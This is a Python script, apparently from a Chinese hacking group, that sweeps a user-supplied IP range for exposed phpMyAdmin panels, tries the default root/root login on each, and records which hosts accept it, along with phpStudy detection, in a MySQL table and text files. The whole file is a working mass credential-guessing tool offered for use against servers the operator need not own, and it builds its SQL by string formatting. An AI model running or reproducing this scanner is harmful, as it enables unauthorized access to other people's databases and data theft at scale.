import requests
import IPy
import re
import datetime
import pymysql

print(
    "本工具需要MySQL服务器用于测试phpMyAdmin用户名密码！\n使用前请确保你已部署MySQL服务器！\n\n\n                                           ——1949HACKER.Vladimir\n                                           https://1949hacker.cn\n                                           Telegram群组：https://t.me/+B5cnCIyGLcZjODA9"
)
HOST = input("请输入你的MySQL服务器地址：")
USER = input("请输入你的MySQL服务器用户名：")
PASSWD = input("请输入你的MySQL服务器密码：")
DATABASE = input("请输入你的MySQL服务器数据库：")
db = pymysql.Connect(host=HOST, user=USER, password=PASSWD, database=DATABASE)
cursor = db.cursor()

ipsegment = input('请输入ip网段：')
filename = ipsegment.split('/')[0]
file_1 = filename + '.txt'
file_2 = filename + '_root.txt'

payload = {'pma_username': 'root', 'pma_password': 'root'}
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
ip = IPy.IP(ipsegment)
phpmyadmin = []
phpmyadmin_root = []
for i in ip:
    url = 'http://' + str(i) + '/phpmyadmin/index.php'
    print(url)
    try:
        # 根据实际ping延迟来调整0.15数值，单位s
        scan_ip = requests.head(url, timeout=0.3, allow_redirects=False)
        if scan_ip.status_code == 200:
            try:
                if re.search('phpmyadmin', scan_ip.headers['Set-Cookie']):
                    print('这是一个phpmyadmin的后台!')
                    phpmyadmin.append(url)
                    try:
                        r = requests.post(url, headers=headers, data=payload)
                        if 'name="login_form"' not in r.text:
                            print('使用默认密码登录成功')
                            password = 'root'
                            version = ''
                            if 'phpStudy' in r.text:
                                version = 'phpStudy'
                            phpmyadmin_root.append(url)
                        else:
                            print('非默认密码！')
                            password = ''
                            version = ''
                        sql = "insert into ip (ip,url,password,version,更新时间) VALUES ('%s','%s','%s','%s','%s')" % (
                            i, url, password, version, datetime.datetime.now())
                        cursor.execute(sql)
                        db.commit()
                        print(sql)
                    except Exception:
                        pass
            except KeyError:
                print('没有set-cookie,非phpmyadmin后台')
    except Exception:
        pass
db.close()

with open(file_1, 'w') as f, open(file_2, 'w') as e:
    f.write("\n".join(phpmyadmin))
    e.write("\n".join(phpmyadmin_root))
